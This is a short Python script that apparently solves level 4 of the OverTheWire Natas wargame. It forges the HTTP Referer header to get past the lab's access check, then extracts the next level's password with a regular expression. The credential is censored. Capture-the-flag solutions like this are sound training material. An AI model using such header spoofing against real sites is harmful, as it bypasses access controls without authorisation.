import requests
import re

username = "natas4"
password = "<censored>"
url = "http://%s.natas.labs.overthewire.org/"  % username

# HTTP headers manipulation
headers = { "Referer" : "http://natas5.natas.labs.overthewire.org/" }

response = requests.get(url, auth=((username,password)))
print(response.text)
print("="*50)
print(response.headers)
print("="*50)

response = requests.get(url, auth=((username,password)), headers=headers)
pageContent = response.text
code = re.findall("The password for natas\d is (.*)", pageContent)[0]
print("\nThe password for the next level is: " + code)